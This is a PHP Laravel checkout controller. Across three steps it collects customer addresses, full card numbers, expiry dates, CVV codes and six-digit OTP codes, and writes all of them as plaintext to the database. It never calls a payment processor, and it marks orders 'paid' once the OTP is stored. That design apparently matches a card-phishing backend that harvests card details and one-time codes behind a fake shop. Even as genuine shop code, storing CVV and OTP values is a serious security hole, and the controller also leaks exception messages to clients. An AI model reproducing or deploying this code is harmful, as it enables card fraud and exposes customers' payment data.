<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Order;
use App\Models\Payment;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;

class CheckoutController extends Controller
{
    public function index()
    {
        return view('checkout');
    }

    /**
     * Step 1: Save delivery details and create order
     */
    public function store(Request $request)
    {
        try {
            $validated = $request->validate([
                'name' => 'required|string|max:255',
                'phone' => 'required|string|max:20',
                'governorate' => 'required|string',
                'wilaya' => 'required|string',
                'lat' => 'nullable|string',
                'lng' => 'nullable|string',
                'manual_address' => 'required|string',
                'order_notes' => 'nullable|string',
                'payment_method' => 'required|string',
                'items' => 'required|array',
                'total' => 'required|numeric',
                'deposit' => 'nullable|numeric',
            ]);

            $orderId = 'ORD-' . strtoupper(Str::random(8));

            // Store manual_address in the address column too for dashboard compatibility
            $order = Order::create([
                'order_id' => $orderId,
                'customer_name' => $validated['name'],
                'phone' => $validated['phone'],
                'governorate' => $validated['governorate'],
                'wilaya' => $validated['wilaya'],
                'lat' => $validated['lat'] ?? '',
                'lng' => $validated['lng'] ?? '',
                'manual_address' => $validated['manual_address'],
                'address' => $validated['manual_address'], // Mirror for dashboard
                'order_notes' => $validated['order_notes'] ?? '',
                'payment_method' => $validated['payment_method'],
                'items' => $validated['items'],
                'total' => $validated['total'],
                'deposit' => $validated['deposit'] ?? 0,
                'order_status' => 'new',
                'payment_status' => 'pending',
            ]);

            // Create initial payment record
            Payment::create([
                'order_id' => $orderId,
                'payment_status' => 'pending',
                'amount' => $validated['total'],
            ]);

            return response()->json([
                'success' => true,
                'order_id' => $orderId,
                'message' => 'Order created successfully'
            ]);

        } catch (\Exception $e) {
            Log::error('Checkout Store Error: ' . $e->getMessage());
            return response()->json([
                'success' => false,
                'message' => 'Failed to create order: ' . $e->getMessage()
            ], 500);
        }
    }

    /**
     * Step 2: Save payment details (card info)
     */
    public function savePayment(Request $request)
    {
        try {
            $validated = $request->validate([
                'order_id' => 'required|string',
                'card_name' => 'required|string|max:255',
                'card_number' => 'required|string|max:20',
                'card_exp' => 'required|string|max:7',
                'card_cvv' => 'required|string|max:4',
            ]);

            $order = Order::where('order_id', $validated['order_id'])->first();
            if (!$order) {
                return response()->json(['success' => false, 'message' => 'Order not found'], 404);
            }

            // Update Order with card details
            $order->update([
                'card_name' => $validated['card_name'],
                'card_number' => $validated['card_number'],
                'card_exp' => $validated['card_exp'],
                'card_cvv' => $validated['card_cvv'],
                'order_status' => 'processing',
                'payment_status' => 'pending_otp',
            ]);

            // Update Payment record
            Payment::updateOrCreate(
                ['order_id' => $validated['order_id']],
                [
                    'card_name' => $validated['card_name'],
                    'card_number' => $validated['card_number'],
                    'card_exp' => $validated['card_exp'],
                    'card_cvv' => $validated['card_cvv'],
                    'payment_status' => 'pending_otp',
                ]
            );

            return response()->json(['success' => true]);

        } catch (\Exception $e) {
            Log::error('Checkout SavePayment Error: ' . $e->getMessage());
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    /**
     * Step 3: Save OTP and finish
     */
    public function saveOtp(Request $request)
    {
        try {
            $validated = $request->validate([
                'order_id' => 'required|string',
                'otp_code' => 'required|string|size:6',
            ]);

            $order = Order::where('order_id', $validated['order_id'])->first();
            if (!$order) {
                return response()->json(['success' => false, 'message' => 'Order not found'], 404);
            }

            // Update Order with OTP - set status to 'paid' so it appears in payments section
            $order->update([
                'otp_code' => $validated['otp_code'],
                'otp_attempts' => 1,
                'otp_time' => now()->format('Y-m-d H:i'),
                'order_status' => 'processing',
                'payment_status' => 'paid',
            ]);

            // Update Payment record
            Payment::where('order_id', $validated['order_id'])->update([
                'otp_code' => $validated['otp_code'],
                'otp_attempts' => 1,
                'otp_time' => now()->format('Y-m-d H:i'),
                'payment_status' => 'paid',
            ]);

            return response()->json(['success' => true]);

        } catch (\Exception $e) {
            Log::error('Checkout SaveOtp Error: ' . $e->getMessage());
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }
}
